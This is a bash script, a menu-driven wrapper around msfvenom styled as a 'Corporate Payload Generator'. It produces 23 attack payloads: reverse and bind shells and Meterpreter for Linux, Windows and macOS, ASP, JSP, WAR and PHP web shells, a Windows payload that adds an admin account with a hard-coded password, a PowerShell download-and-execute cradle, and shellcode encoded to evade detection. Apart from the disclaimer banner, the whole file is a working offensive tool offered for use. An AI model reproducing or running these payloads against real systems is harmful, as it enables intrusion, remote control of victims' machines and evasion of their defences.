#!/bin/bash

# Corporate Payload Generator - Colorful Edition
# Security Team Utility - Authorized Use Only

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
ORANGE='\033[0;33m'
MAGENTA='\033[1;35m'
NC='\033[0m' # No Color

# Styles
BOLD='\033[1m'
UNDERLINE='\033[4m'
BLINK='\033[5m'

# Configuration
OUTPUT_DIR="./payloads"
LOG_FILE="./payload_generator.log"
TIMESTAMP=$(date +"%Y-%m-%d %H:%M:%S")

# Banner function
show_banner() {
    clear
    echo -e "${PURPLE}"
    echo "╔══════════════════════════════════════════════════════════════════════════════╗"
    echo "║                                                                              ║"
    echo -e "║  ${CYAN}▓▓▓▓▓▓▓▓▓▓ ${PURPLE}                                                                      ║"
    echo -e "║  ${CYAN}▓▓▓▓▓▓▓▓▓▓ ${PURPLE}  ${GREEN}╔═╗╔═╗╔═╗╔═╗╦ ╦╔═╗╦╔╗╔╔═╗  ${BOLD}${YELLOW}╔═╗╔═╗╔╦╗╔═╗╦╔╗╔╔═╗╔╦╗╦╔═╗╔╗╔${PURPLE}  ║"
    echo -e "║  ${CYAN}▓▓▓▓▓▓▓▓▓▓ ${PURPLE}  ${GREEN}╠═╣╠═╝╠═╝║  ╠═╣║╣ �║║║║║ ╦  ${BOLD}${YELLOW}╠═╝╠═╣ ║ ║╣ ║║║║║╣  ║ ║║ ║║║║${PURPLE}  ║"
    echo -e "║  ${CYAN}▓▓▓▓▓▓▓▓▓▓ ${PURPLE}  ${GREEN}╩ ╩╩  ╩  ╚═╝╩ ╩╚═╝╩╝╚╝╚═╝  ${BOLD}${YELLOW}╩  ╩ ╩ ╩ ╚═╝╩╝╚╝╚═╝ ╩ ╩╚═╝╝╚╝${PURPLE}  ║"
    echo -e "║  ${CYAN}▓▓▓▓▓▓▓▓▓▓ ${PURPLE}                                                                      ║"
    echo -e "║                                                                              ║"
    echo -e "║  ${BOLD}${WHITE}Corporate Payload Generator v3.0 ${MAGENTA}✦ ${GREEN}Colorful Edition ${MAGENTA}✦${PURPLE}                          ║"
    echo -e "║  ${RED}⚠  ${YELLOW}Authorized Security Testing Only ${RED}⚠${PURPLE}                                   ║"
    echo "║                                                                              ║"
    echo "╚══════════════════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

# Initialize environment
initialize_environment() {
    if [ ! -d "$OUTPUT_DIR" ]; then
        mkdir -p "$OUTPUT_DIR"
        echo -e "${GREEN}[${WHITE}+${GREEN}]${NC} Created output directory: ${CYAN}$OUTPUT_DIR${NC}"
        echo "[$TIMESTAMP] Created output directory: $OUTPUT_DIR" >> "$LOG_FILE"
    fi
    
    if ! command -v msfvenom &> /dev/null; then
        echo -e "${RED}[${WHITE}!${RED}]${NC} ERROR: msfvenom not found. Please install Metasploit Framework."
        exit 1
    fi
}

# Logging function
log_activity() {
    echo "[$TIMESTAMP] $1" >> "$LOG_FILE"
}

# Colorful input validation
validate_input() {
    local input_type=$1
    local value=$2
    
    case $input_type in
        "IP")
            if [[ ! $value =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
                echo -e "${RED}[${WHITE}!${RED}]${NC} Invalid IP address format: ${YELLOW}$value${NC}"
                return 1
            fi
            ;;
        "PORT")
            if [[ ! $value =~ ^[0-9]+$ ]] || [ $value -lt 1 ] || [ $value -gt 65535 ]; then
                echo -e "${RED}[${WHITE}!${RED}]${NC} Port must be between 1 and 65535: ${YELLOW}$value${NC}"
                return 1
            fi
            ;;
    esac
    return 0
}

# Colorful user input
get_user_input() {
    case $1 in
        "LHOST")
            while true; do
                echo -e "${CYAN}┌─[${GREEN}${BOLD}LHOST Input${NC}${CYAN}]${NC}"
                echo -e "${CYAN}└──╼ ${YELLOW}🎯${NC} Enter LHOST (Listening Host IP): ${GREEN}${BLINK}▊${NC}"
                read -p "" LHOST
                if validate_input "IP" "$LHOST"; then
                    break
                fi
            done
            ;;
        "LPORT")
            while true; do
                echo -e "${BLUE}┌─[${GREEN}${BOLD}LPORT Input${NC}${BLUE}]${NC}"
                echo -e "${BLUE}└──╼ ${YELLOW}🔊${NC} Enter LPORT (Listening Port): ${GREEN}${BLINK}▊${NC}"
                read -p "" LPORT
                if validate_input "PORT" "$LPORT"; then
                    break
                fi
            done
            ;;
        "TARGET_IP")
            while true; do
                echo -e "${PURPLE}┌─[${GREEN}${BOLD}Target IP${NC}${PURPLE}]${NC}"
                echo -e "${PURPLE}└──╼ ${YELLOW}🎯${NC} Enter Target IP for Nishang: ${GREEN}${BLINK}▊${NC}"
                read -p "" TARGET_IP
                if validate_input "IP" "$TARGET_IP"; then
                    break
                fi
            done
            ;;
    esac
}

# Colorful menu
display_menu() {
    show_banner
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════════════════════╗"
    echo -e "║ ${BOLD}${WHITE}🚀 PLATFORM      ${CYAN}│ ${BOLD}${WHITE}🎯 TYPE                     ${CYAN}│ ${BOLD}${WHITE}📋 DESCRIPTION                ${CYAN}║"
    echo -e "╠══════════════════════════════════════════════════════════════════════════════╣${NC}"
    
    echo -e "${BOLD}${WHITE}📁 LINUX PLATFORMS${NC}"
    echo -e "${GREEN} 1.${NC} Linux x86    ${YELLOW}↻${NC} Meterpreter Reverse TCP  ${CYAN}[Multi-stage]${NC}"
    echo -e "${GREEN} 2.${NC} Linux x86    ${BLUE}⚡${NC} Meterpreter Bind TCP     ${CYAN}[Multi-stage]${NC}"
    echo -e "${GREEN} 3.${NC} Linux x64    ${BLUE}⚡${NC} Shell Bind TCP          ${CYAN}[Single-stage]${NC}"
    echo -e "${GREEN} 4.${NC} Linux x64    ${YELLOW}↻${NC} Shell Reverse TCP       ${CYAN}[Single-stage]${NC}"
    
    echo -e "\n${BOLD}${WHITE}📁 WINDOWS PLATFORMS${NC}"
    echo -e "${GREEN} 5.${NC} Windows      ${YELLOW}↻${NC} Meterpreter Reverse TCP"
    echo -e "${GREEN} 6.${NC} Windows      ${PURPLE}🌐${NC} Meterpreter HTTP Reverse"
    echo -e "${GREEN} 7.${NC} Windows      ${BLUE}⚡${NC} Meterpreter Bind TCP"
    echo -e "${GREEN} 8.${NC} Windows      ${YELLOW}↻${NC} CMD Reverse TCP        ${CYAN}[Multi-stage]${NC}"
    echo -e "${GREEN} 9.${NC} Windows      ${YELLOW}↻${NC} CMD Reverse TCP        ${CYAN}[Single-stage]${NC}"
    echo -e "${GREEN}10.${NC} Windows      ${RED}👤${NC} Add User Privilege Escalation"
    
    echo -e "\n${BOLD}${WHITE}📁 MACOS PLATFORMS${NC}"
    echo -e "${GREEN}11.${NC} macOS x86    ${YELLOW}↻${NC} Shell Reverse TCP"
    echo -e "${GREEN}12.${NC} macOS x86    ${BLUE}⚡${NC} Shell Bind TCP"
    
    echo -e "\n${BOLD}${WHITE}📁 WEB & SCRIPT PLATFORMS${NC}"
    echo -e "${GREEN}13.${NC} Python       ${YELLOW}🐍${NC} Reverse Shell"
    echo -e "${GREEN}14.${NC} Bash         ${BLUE}🐚${NC} Reverse Shell"
    echo -e "${GREEN}15.${NC} Perl         ${PURPLE}📜${NC} Reverse Shell"
    echo -e "${GREEN}16.${NC} ASP          ${YELLOW}↻${NC} Meterpreter Reverse TCP"
    echo -e "${GREEN}17.${NC} JSP          ${ORANGE}☕${NC} Reverse Shell"
    echo -e "${GREEN}18.${NC} WAR          ${ORANGE}☕${NC} Reverse Shell"
    echo -e "${GREEN}19.${NC} PHP          ${PURPLE}🐘${NC} Basic Template"
    echo -e "${GREEN}20.${NC} PHP          ${YELLOW}↻${NC} Meterpreter Reverse TCP"
    
    echo -e "\n${BOLD}${WHITE}📁 ADVANCED & EVASION${NC}"
    echo -e "${GREEN}21.${NC} Windows      ${MAGENTA}💻${NC} Nishang PowerShell Delivery"
    echo -e "${GREEN}22.${NC} Windows      ${RED}🔒${NC} Shikata Ga Nai Encoded"
    echo -e "${GREEN}23.${NC} Windows      ${RED}🔒${NC} Fnstenv Mov Encoded"
    
    echo -e "${CYAN}╠══════════════════════════════════════════════════════════════════════════════╣"
    echo -e "║${RED}  0.${NC} ${BOLD}${RED}🚪 Exit Generator${NC}${CYAN}                                                         ║"
    echo -e "╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
    echo
    echo -e "${BOLD}${WHITE}✨ Choose an option: ${GREEN}${BLINK}▊${NC}"
    read -p "" choice
}

# Animated progress function
show_progress() {
    local pid=$1
    local message=$2
    local spin='⣷⣯⣟⡿⢿⣻⣽⣾'
    local i=0
    
    while kill -0 $pid 2>/dev/null; do
        i=$(( (i+1) % 8 ))
        echo -ne "\r${YELLOW}${spin:$i:1}${NC} $message... "
        sleep 0.1
    done
    echo -ne "\r${GREEN}✓${NC} $message... Completed!"
    echo
}

# Colorful payload generation
generate_payload() {
    local payload_name="$1"
    local command="$2"
    local filename="$3"
    local full_path="${OUTPUT_DIR}/${filename}"
    
    echo
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════════════════════╗"
    echo -e "║${BOLD}${WHITE}                          🚀 GENERATING PAYLOAD 🚀                         ${CYAN}║"
    echo -e "╠══════════════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${BLUE}│${NC} ${BOLD}Type:${NC}    ${GREEN}$payload_name${NC}"
    echo -e "${BLUE}│${NC} ${BOLD}Output:${NC}  ${YELLOW}$full_path${NC}"
    echo -e "${BLUE}│${NC} ${BOLD}Time:${NC}    ${PURPLE}$TIMESTAMP${NC}"
    echo -e "${CYAN}╠══════════════════════════════════════════════════════════════════════════════╣${NC}"
    
    # Execute command with progress animation
    (eval "$command" > "$full_path" 2>/dev/null) &
    local pid=$!
    show_progress $pid "Generating payload"
    
    if [ $? -eq 0 ] && [ -s "$full_path" ]; then
        local file_size=$(du -h "$full_path" | cut -f1)
        echo -e "${GREEN}│${NC} ${BOLD}Status:${NC}  ${GREEN}✅ SUCCESS${NC}"
        echo -e "${GREEN}│${NC} ${BOLD}Size:${NC}    ${CYAN}$file_size${NC}"
        echo -e "${CYAN}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
        log_activity "SUCCESS: $payload_name -> $filename"
        
        # Show file location
        echo -e "\n${GREEN}🎯 ${BOLD}Payload saved to:${NC} ${YELLOW}$full_path${NC}"
    else
        echo -e "${RED}│${NC} ${BOLD}Status:${NC}  ${RED}❌ FAILED${NC}"
        echo -e "${RED}│${NC} ${BOLD}Error:${NC}   Payload generation failed"
        echo -e "${CYAN}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
        log_activity "FAILED: $payload_name"
        rm -f "$full_path"
    fi
}

# Main execution function
main() {
    initialize_environment
    
    echo -e "${GREEN}${BOLD}"
    echo "💰 Corporate Payload Generator Initialized"
    echo -e "${CYAN}📁 Output Directory: ${YELLOW}$OUTPUT_DIR${NC}"
    echo -e "${CYAN}📝 Log File: ${YELLOW}$LOG_FILE${NC}"
    echo -e "${PURPLE}===============================================================${NC}"
    sleep 2
    
    while true; do
        display_menu
        
        case "$choice" in
            0)
                echo
                echo -e "${RED}${BOLD}"
                echo "╔══════════════════════════════════════════════════════════════╗"
                echo "║                     🚪 EXITING GENERATOR 🚪                  ║"
                echo "║                                                              ║"
                echo "║          Thank you for using Corporate Payload Generator!    ║"
                echo "║                 Stay secure! 🔒                              ║"
                echo "╚══════════════════════════════════════════════════════════════╝"
                echo -e "${NC}"
                log_activity "Session terminated by user"
                exit 0
                ;;
            
            # Linux Payloads
            1)
                get_user_input "LHOST"
                get_user_input "LPORT"
                generate_payload "🐧 Linux x86 Meterpreter Reverse TCP" \
                    "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=\"$LHOST\" LPORT=\"$LPORT\" -f elf" \
                    "linux_x86_meterpreter_reverse.elf"
                ;;
            2)
                get_user_input "LPORT"
                generate_payload "🐧 Linux x86 Meterpreter Bind TCP" \
                    "msfvenom -p linux/x86/meterpreter/bind_tcp LPORT=\"$LPORT\" -f elf" \
                    "linux_x86_meterpreter_bind.elf"
                ;;
            3)
                get_user_input "LPORT"
                generate_payload "🐧 Linux x64 Shell Bind TCP" \
                    "msfvenom -p linux/x64/shell_bind_tcp LPORT=\"$LPORT\" -f elf" \
                    "linux_x64_shell_bind.elf"
                ;;
            4)
                get_user_input "LHOST"
                get_user_input "LPORT"
                generate_payload "🐧 Linux x64 Shell Reverse TCP" \
                    "msfvenom -p linux/x64/shell_reverse_tcp LHOST=\"$LHOST\" LPORT=\"$LPORT\" -f elf" \
                    "linux_x64_shell_reverse.elf"
                ;;
            
            # Windows Payloads
            5)
                get_user_input "LHOST"
                get_user_input "LPORT"
                generate_payload "🪟 Windows Meterpreter Reverse TCP" \
                    "msfvenom -p windows/meterpreter/reverse_tcp LHOST=\"$LHOST\" LPORT=\"$LPORT\" -f exe" \
                    "windows_meterpreter_reverse.exe"
                ;;
            6)
                get_user_input "LHOST"
                get_user_input "LPORT"
                generate_payload "🪟 Windows Meterpreter HTTP Reverse" \
                    "msfvenom -p windows/meterpreter/reverse_http LHOST=\"$LHOST\" LPORT=\"$LPORT\" HttpUserAgent=\"Corporate Browser\" -f exe" \
                    "windows_meterpreter_http.exe"
                ;;
            7)
                get_user_input "LPORT"
                generate_payload "🪟 Windows Meterpreter Bind TCP" \
                    "msfvenom -p windows/meterpreter/bind_tcp LPORT=\"$LPORT\" -f exe" \
                    "windows_meterpreter_bind.exe"
                ;;
            8)
                get_user_input "LHOST"
                get_user_input "LPORT"
                generate_payload "🪟 Windows CMD Reverse TCP (Multi-stage)" \
                    "msfvenom -p windows/shell/reverse_tcp LHOST=\"$LHOST\" LPORT=\"$LPORT\" -f exe" \
                    "windows_cmd_reverse_multi.exe"
                ;;
            9)
                get_user_input "LHOST"
                get_user_input "LPORT"
                generate_payload "🪟 Windows CMD Reverse TCP (Single-stage)" \
                    "msfvenom -p windows/shell_reverse_tcp LHOST=\"$LHOST\" LPORT=\"$LPORT\" -f exe" \
                    "windows_cmd_reverse_single.exe"
                ;;
            10)
                generate_payload "🪟 Windows Add User Privilege Escalation" \
                    "msfvenom -p windows/adduser USER=corp_admin PASS='P@ssw0rd123!' -f exe" \
                    "windows_adduser.exe"
                ;;
            
            # macOS Payloads
            11)
                get_user_input "LHOST"
                get_user_input "LPORT"
                generate_payload "🍎 macOS x86 Shell Reverse TCP" \
                    "msfvenom -p osx/x86/shell_reverse_tcp LHOST=\"$LHOST\" LPORT=\"$LPORT\" -f macho" \
                    "macos_x86_shell_reverse.macho"
                ;;
            12)
                get_user_input "LPORT"
                generate_payload "🍎 macOS x86 Shell Bind TCP" \
                    "msfvenom -p osx/x86/shell_bind_tcp LPORT=\"$LPORT\" -f macho" \
                    "macos_x86_shell_bind.macho"
                ;;
            
            # Web & Script Payloads
            13)
                get_user_input "LHOST"
                get_user_input "LPORT"
                generate_payload "🐍 Python Reverse Shell" \
                    "msfvenom -p cmd/unix/reverse_python LHOST=\"$LHOST\" LPORT=\"$LPORT\" -f raw" \
                    "python_reverse.py"
                ;;
            14)
                get_user_input "LHOST"
                get_user_input "LPORT"
                generate_payload "🐚 Bash Reverse Shell" \
                    "msfvenom -p cmd/unix/reverse_bash LHOST=\"$LHOST\" LPORT=\"$LPORT\" -f raw" \
                    "bash_reverse.sh"
                ;;
            15)
                get_user_input "LHOST"
                get_user_input "LPORT"
                generate_payload "📜 Perl Reverse Shell" \
                    "msfvenom -p cmd/unix/reverse_perl LHOST=\"$LHOST\" LPORT=\"$LPORT\" -f raw" \
                    "perl_reverse.pl"
                ;;
            16)
                get_user_input "LHOST"
                get_user_input "LPORT"
                generate_payload "🌐 ASP Meterpreter Reverse TCP" \
                    "msfvenom -p windows/meterpreter/reverse_tcp LHOST=\"$LHOST\" LPORT=\"$LPORT\" -f asp" \
                    "asp_meterpreter.asp"
                ;;
            17)
                get_user_input "LHOST"
                get_user_input "LPORT"
                generate_payload "☕ JSP Reverse Shell" \
                    "msfvenom -p java/jsp_shell_reverse_tcp LHOST=\"$LHOST\" LPORT=\"$LPORT\" -f raw" \
                    "jsp_shell.jsp"
                ;;
            18)
                get_user_input "LHOST"
                get_user_input "LPORT"
                generate_payload "☕ WAR Reverse Shell" \
                    "msfvenom -p java/jsp_shell_reverse_tcp LHOST=\"$LHOST\" LPORT=\"$LPORT\" -f war" \
                    "war_shell.war"
                ;;
            19)
                generate_payload "🐘 PHP Basic Template" \
                    "echo '<?php' && echo '// Corporate Security Testing'" \
                    "php_template.php"
                ;;
            20)
                get_user_input "LHOST"
                get_user_input "LPORT"
                generate_payload "🐘 PHP Meterpreter Reverse TCP" \
                    "msfvenom -p php/meterpreter_reverse_tcp LHOST=\"$LHOST\" LPORT=\"$LPORT\" -f raw" \
                    "php_meterpreter.php"
                ;;
            
            # Advanced & Evasion Techniques
            21)
                get_user_input "TARGET_IP"
                generate_payload "💻 Windows Nishang PowerShell Delivery" \
                    "msfvenom -a x86 --platform Windows -p windows/exec CMD=\"powershell \\\"IEX(New-Object Net.WebClient).DownloadString('http://$TARGET_IP/tools/nishang.ps1')\\\"\" -f python" \
                    "nishang_delivery.py"
                ;;
            22)
                get_user_input "LHOST"
                get_user_input "LPORT"
                generate_payload "🔒 Windows Shikata Ga Nai Encoded Shellcode" \
                    "msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=\"$LHOST\" LPORT=\"$LPORT\" -f c -e x86/shikata_ga_nai -b \"\\x00\\x0a\\x0d\"" \
                    "shellcode_shikata_ga_nai.c"
                ;;
            23)
                get_user_input "LHOST"
                get_user_input "LPORT"
                generate_payload "🔒 Windows Fnstenv Mov Encoded Shellcode" \
                    "msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=\"$LHOST\" LPORT=\"$LPORT\" -f c -e x86/fnstenv_mov -b \"\\x00\\x0a\\x0d\"" \
                    "shellcode_fnstenv_mov.c"
                ;;
            
            *)
                echo -e "${RED}[${WHITE}!${RED}]${NC} Invalid selection: ${YELLOW}$choice${NC}"
                echo -e "${YELLOW}Please choose a valid option (0-23)${NC}"
                ;;
        esac
        
        echo
        echo -e "${CYAN}Press ${GREEN}Enter${CYAN} to continue...${NC}"
        read -p "" _dummy
    done
}

# Security disclaimer with color
echo -e "${RED}${BOLD}"
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║                   ⚠  SECURITY DISCLAIMER ⚠                  ║"
echo "║                                                              ║"
echo "║  CORPORATE SECURITY TOOL - AUTHORIZED USE ONLY              ║"
echo "║  This tool is for legitimate security testing purposes only ║"
echo "║  Unauthorized use is strictly prohibited                    ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo -e "${NC}"
sleep 3

# Execute main function
main
